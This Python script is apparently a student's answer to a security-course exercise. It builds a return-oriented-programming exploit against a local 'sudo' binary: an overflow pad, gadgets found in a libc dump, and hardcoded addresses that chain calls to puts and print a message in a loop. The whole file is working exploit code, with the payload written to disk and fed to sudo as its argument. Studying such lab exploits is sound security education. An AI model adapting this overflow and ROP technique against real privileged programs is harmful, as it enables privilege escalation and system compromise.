import os, sys, struct

import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'
HEX_BASE = 16


def get_string(student_id):
    return 'Take me (%s) to your leader!' % student_id


def get_arg():
    gs = GadgetSearch(LIBC_DUMP_PATH, 0xb7c38750)

    str_value = get_string(302893680)
    shellcode_start_addr = 0xbfffe154 # this is where our actual logic begins, after loading the address of 'puts' into ebp
    num_rop_commands = 5 # we need this to calculate the address of our string
    str_value_addr = shellcode_start_addr + num_rop_commands * 4
    puts_addr = 0xb7c80ca0 # from gdb

    pop_ebp_addr = int(gs.find_format('pop ebp')[1], HEX_BASE)
    pop_edx_addr = int(gs.find_format('pop edx')[1], HEX_BASE)
    pop_esp_addr = int(gs.find_format('pop esp')[1], HEX_BASE)

    buff = 'a' * (0x49 - len("thisisasalt")) # same as in q1
    old_ebp = 'b' * 4 # same as in q1
    buffer_part = buff + old_ebp

    # for details please see q4.txt
    shellcode = struct.pack("<I", pop_ebp_addr) + struct.pack("<I", puts_addr) + \
    struct.pack("<I", puts_addr) + struct.pack("<I", pop_edx_addr) + \
    struct.pack("<I", str_value_addr) + struct.pack("<I", pop_esp_addr) +\
    struct.pack("<I", shellcode_start_addr) + str_value

    return buffer_part + shellcode



def main(argv):
	arg = get_arg()
	with open("./pswd.bin", 'wb') as f:
		f.write(arg)

	os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())


if __name__ == '__main__':
    main(sys.argv)
